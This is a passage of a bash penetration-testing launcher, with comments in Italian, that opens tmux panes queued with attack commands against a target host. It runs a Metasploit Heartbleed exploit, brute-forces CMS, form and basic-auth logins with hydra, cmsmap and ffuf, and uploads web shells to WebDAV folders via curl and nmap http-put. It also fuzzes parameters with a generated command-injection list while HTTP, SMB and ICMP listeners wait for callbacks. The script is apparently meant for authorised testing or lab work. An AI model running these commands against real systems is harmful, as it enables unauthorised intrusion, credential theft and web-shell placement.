tmux send-keys -t PT:11.0 "# SSL analysis with sslscan" Enter
tmux send-keys -t PT:11.0 "sslscan $ip"
tmux send-keys -t PT:11.1 "# certificate analysis" Enter
tmux send-keys -t PT:11.1 "openssl s_client -connect $site:443 </dev/null 2>/dev/null | openssl x509 -out $site.crt; echo \"Certificato scaricato: $site.crt\" # get certificate info"
cd $folderProject


# WEB Information from web
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:12 -n 'WEB Information from web'
tmux split-window -v -t PT:12.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:12.0 "# get info from search site" Enter
tmux send-keys -t PT:12.0 "xdg-open \"https://securityheaders.com/\" & xdg-open \"https://www.ssllabs.com/ssltest/\" & xdg-open \"https://www.social-searcher.com/\""
cd $folderProject


# openssl_heartbleed
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:13 -n 'openssl_heartbleed'
tmux split-window -v -t PT:13.0
tmux split-window -v -t PT:13.1
tmux split-window -v -t PT:13.2
tmux split-window -v -t PT:13.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:13.0 "# verify heartbleed with nmap" Enter
tmux send-keys -t PT:13.0 "nmap -p 443 -sV --script=ssl-heartbleed $ip"
tmux send-keys -t PT:13.0 "# verify heartbleed with sslyze" Enter
tmux send-keys -t PT:13.0 "sslyze --heartbleed $ip"
tmux send-keys -t PT:13.0 "# verify heartbleed with sslscan" Enter
tmux send-keys -t PT:13.0 "sslscan $ip"
tmux send-keys -t PT:13.1 "# attack target by means of heartbleed" Enter
tmux send-keys -t PT:13.1 "msfconsole -q -x \"use auxiliary/scanner/ssl/openssl_heartbleed;set RHOSTS $ip;set RPORT 443;set VERBOSE true;exploit;\""
cd $folderProject


# CMS: Joomla, wordpress, drupal & co
cd $folderProjectWebInfo
# Layout
tmux new-window -t PT:14 -n 'CMS: Joomla, wordpress, drupal & co'
tmux split-window -v -t PT:14.0
tmux split-window -v -t PT:14.1
tmux split-window -v -t PT:14.2
tmux split-window -v -t PT:14.3
tmux select-pane -t "14.0"
tmux split-window -h -t "14.0"
tmux split-window -h -t "14.0"
tmux select-pane -t "14.3"
tmux split-window -h -t "14.3"
tmux split-window -h -t "14.3"
tmux split-window -h -t "14.3"
tmux select-pane -t "14.7"
tmux split-window -h -t "14.7"
tmux split-window -h -t "14.7"
tmux split-window -h -t "14.7"
tmux select-pane -t "14.11"
tmux split-window -h -t "14.11"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:14.0 "# update (if necessary) scan tools" Enter
tmux send-keys -t PT:14.0 "wpscan --update; joomscan update; cmsmap http://$site --update"
tmux send-keys -t PT:14.1 "# whatweb analysis of target site" Enter
tmux send-keys -t PT:14.1 "whatweb -a 3 http://$site"
tmux send-keys -t PT:14.2 "# cmsmap to scan target" Enter
tmux send-keys -t PT:14.2 "cmsmap http://$site -F"
tmux send-keys -t PT:14.3 "# wordpress scan with nmap analysis" Enter
tmux send-keys -t PT:14.3 "nmap -Pn -vv -p 80 --script=http-wordpress* $ip -oA out.wp"
tmux send-keys -t PT:14.4 "# wpscan with principal plugins and themes" Enter
tmux send-keys -t PT:14.4 "wpscan --url http://$site --enumerate p,t,cb,dbe,u --plugins-detection aggressive --api-token $wptoken -o wpscan.txt [--disable-tls-checks]"
tmux send-keys -t PT:14.5 "# wpscan with all plugins and themes" Enter
tmux send-keys -t PT:14.5 "wpscan --url http://$site --enumerate ap,at,cb,dbe,u --plugins-detection aggressive --api-token $wptoken  -o wpscanALL.txt[--disable-tls-checks]"
tmux send-keys -t PT:14.6 "# cmsmap bruteforceCMS" Enter
tmux send-keys -t PT:14.6 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
tmux send-keys -t PT:14.7 "# joomscam target site" Enter
tmux send-keys -t PT:14.7 "joomscan -u http://$site"
tmux send-keys -t PT:14.8 "# msfconsole to test joomla target site" Enter
tmux send-keys -t PT:14.8 "msfconsole -q -x \"use auxiliary/scanner/http/joomla_plugins;set RHOSTS $ip;set THREADS 5;run\""
tmux send-keys -t PT:14.9 "# juumla to test joomla target site" Enter
tmux send-keys -t PT:14.9 "python /opt/juumla/main.py -u http://$site"
tmux send-keys -t PT:14.10 "# cmsmap bruteforce" Enter
tmux send-keys -t PT:14.10 "sudo cmsmap https://$site -u ../users.txt -p ../passwords.txt -f J"
tmux send-keys -t PT:14.11 "# scan drupal site with droopescan" Enter
tmux send-keys -t PT:14.11 "droopescan scan drupal -u http://$site -t 32"
cd $folderProject


# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;










        4)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Quick Win: duckduckgo, searchsploit, nessus, nikto, etc
######################
######################


# XXX open_terminal "bash -c 'echo EXPLOITATION; sleep 2;"
# contiene:
# - le funzioni comuni
# - la richiesta dei parametri utente
# - la creazione delle cartelle di progetto
#source "common"
# Creazione di una sessione Tmux con attivazione VPN

tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter

# duckduckgo, msfconsole
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:1 -n 'duckduckgo, searchSploit'
tmux split-window -v -t PT:1.0
tmux split-window -v -t PT:1.1
tmux split-window -v -t PT:1.2
tmux split-window -v -t PT:1.3
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# duckduckgo vulnerability scan" Enter
tmux send-keys -t PT:1.0 "xdg-open \"https://duckduckgo.com/?q=<servizio>+default+password\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+default+credentials\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+vulnerability+poc+github\" & xdg-open \"https://duckduckgo.com/?q=<servizio>+exploit+poc+github\""
tmux send-keys -t PT:1.1 "# searchsploit vulnerability scan" Enter
tmux send-keys -t PT:1.1 "searchsploit \"<servizio>\""
tmux send-keys -t PT:1.2 "# msfconsole vulnerability scan" Enter
tmux send-keys -t PT:1.2 "msfupdate; msfconsole -qx \"search type:exploit <servizio>\""
cd $folderProject


# WEB google dork
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:2 -n 'google dork'
tmux split-window -v -t PT:2.0
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:2.0 "domain=$domain" Enter
tmux send-keys -t PT:2.0 "ip=$ip" Enter
tmux send-keys -t PT:2.0 "site=$site" Enter
tmux send-keys -t PT:2.0 "# google dork" Enter
tmux send-keys -t PT:2.0 "grep -v '^#' $folderProjectEngine/google-dork.txt | sed 's/\$domain/\\$domain/g' | xargs -I {} xdg-open \"https://google.com/?q=\"{}"
cd $folderProject


# Nessus
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:3 -n 'Nessus'
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:3.0 "# nessus vulnerability scan" Enter
tmux send-keys -t PT:3.0 "sudo systemctl start nessusd && sleep 2 && xdg-open \"https://127.0.0.1:8834/\""
cd $folderProject


# Nikto
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:4 -n 'Nikto'
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:4.0 "# Nikto vulnerability scan" Enter
tmux send-keys -t PT:4.0 "sudo nikto -h http://$site"
cd $folderProject


# WEB Bruteforce AuthN
cd $folderProjectQuickWin
# Layout
tmux new-window -t PT:5 -n 'WEB Bruteforce AuthN'
tmux split-window -v -t PT:5.0
tmux split-window -v -t PT:5.1
tmux split-window -v -t PT:5.2
tmux select-pane -t "5.1"
tmux split-window -h -t "5.1"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:5.0 "# find valid dictionary for bruteforce" Enter
tmux send-keys -t PT:5.0 "find /usr/share/seclists/ | grep user | xargs wc -l | sort -n"
tmux send-keys -t PT:5.1 "# bruteforce POST authN" Enter
tmux send-keys -t PT:5.1 "hydra $ip http-form-post \"/form/login.php:user=^USER^&pass=^PASS^:INVALID LOGIN\" -l $pathFile_users -P $pathFile_passwords -vV -f"
tmux send-keys -t PT:5.2 "# bruteforce POST authN with BurpSuite saved request" Enter
tmux send-keys -t PT:5.2 "ffuf -request BurpSavedRequest.txt -request-proto http -w $pathFile_users:FUZZUSR,$pathFile_passwords:FUZZPW $ip"
tmux send-keys -t PT:5.3 "# bruteforce BasicAuth authN" Enter
tmux send-keys -t PT:5.3 "hydra -L $pathFile_users -P $pathFile_passwords -f $ip http-get / # Bruteforce BasicAuth authN"
tmux send-keys -t PT:5.4 "# bruteforce CMS" Enter
tmux send-keys -t PT:5.4 "sudo cmsmap https://$site -u $pathFile_users -p $pathFile_passwords -f W"
cd $folderProject


# WEB DAV
cd $folderProjectQucikWin
# Layout
tmux new-window -t PT:6 -n 'WEB DAV'
tmux split-window -v -t PT:6.0
tmux split-window -v -t PT:6.1
tmux split-window -v -t PT:6.2
tmux split-window -v -t PT:6.3
tmux select-pane -t "6.3"
tmux split-window -h -t "6.3"
tmux split-window -h -t "6.3"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:6.0 "# Bruteforce attack to get Target Site Folders" Enter
tmux send-keys -t PT:6.0 "gobuster dir -u http://$site -x php,html -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt"
tmux send-keys -t PT:6.1 "# Bruteforce attack to get credentials to specific folder" Enter
tmux send-keys -t PT:6.1 "hydra -L $pathFile_users -P $pathFile_passwords $site http-get /"
tmux send-keys -t PT:6.2 "# testing site folders (by means of dictionary) to find webDav permission. User and Passwprd should be provided even if they are not required" Enter
tmux send-keys -t PT:6.2 "$folderProjectEngine/webDAV-scanner.sh /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt http://$site wampp xampp"
tmux send-keys -t PT:6.3 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:6.3 "cadaver $ip"
tmux send-keys -t PT:6.4 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:6.4 "curl -T shell.txt -u login:password http://$ip"
tmux send-keys -t PT:6.5 "# upload file to webDAV folder" Enter
tmux send-keys -t PT:6.5 "nmap -p 80 --script http-put --script-args http-put.url=\"/test/shell.php\",http-put.file=\"shell.php\" $ip"
cd $folderProject


# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;





        5)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> Service AuthN bypass: ssh, ftp, smtp,  etc
######################
######################
echo "work in progress for this section."
;;




        6)
######################
######################
###################### 	>>>>>>>>>>>>>>>>> WEB Service AuthN bypass: brute force, command injection, webDAV, etc
######################
######################
# XXX open_terminal "bash -c 'echo WEB APP: authN bypass; sleep 3;"
# Creazione di una sessione Tmux con attivazione VPN
tmux new-session -d -s PT -n "any other business"
tmux send-keys "ip=$ip" Enter
tmux send-keys "site=$site" Enter
tmux send-keys "domain=$domain" Enter

# WEB Command Injection
cd $folderProjectWebAuthN
# Layout
tmux new-window -t PT:1 -n 'WEB Command Injection'
tmux split-window -v -t PT:1.0
tmux split-window -v -t PT:1.1
tmux split-window -v -t PT:1.2
tmux select-pane -t "1.1"
tmux split-window -h -t "1.1"
tmux split-window -h -t "1.1"
tmux select-pane -t "1.4"
tmux split-window -h -t "1.4"
# Esecuzione dei comandi nelle sottofinestre
tmux send-keys -t PT:1.0 "# automate command injection scan" Enter
tmux send-keys -t PT:1.0 "sudo uniscan -u http://$site -qweds"
tmux send-keys -t PT:1.1 "# activate listener ICMP" Enter
tmux send-keys -t PT:1.1 "sudo tcpdump -i tun0 icmp"
tmux send-keys -t PT:1.2 "# activate listener HTTP" Enter
tmux send-keys -t PT:1.2 "python3 -m http.server 80"
tmux send-keys -t PT:1.3 "# activate listener SMB" Enter
tmux send-keys -t PT:1.3 "impacket-smbserver -smb2support htb \$(pwd)"
#Preparo il file per le command injection
cd $folderProjectEngine
#tmux send-keys -t PT:1.6 "echo \"eseguo da path $folderProjectEngine -> python ./cmdGenerator.py $attackerIP cmdList.txt \""
python ./cmdGenerator.py $attackerIP cmdlist.txt
mv "$folderProjectEngine/out-command-injection-list.txt" "$folderProjectWebAuthN/out-command-injection-list.txt"
cd $folderProjectWebAuthN
tmux send-keys -t PT:1.4"# command injection automation (GET)" Enter
tmux send-keys -t PT:1.4 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" --sc=200 http://$site/?id=FUZZ"
tmux send-keys -t PT:1.5 "# command injection automation (POST)" Enter
tmux send-keys -t PT:1.5 "wfuzz -c -z file,out-command-injection-list.txt -H \"Content-Type: application/x-www-form-urlencoded\" -H \"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3\" -d \"username=admin&password=FUZZ\" --sc=200 http://$site/login.php # cmd injection (POST)"
cd $folderProject


# Attivazione della modalità interattiva
tmux -2 attach-session -t PT
;;







        *)
            echo "Scelta non valida. Per favore, scegli un numero da 0 a 6."
            ;;
    esac
done
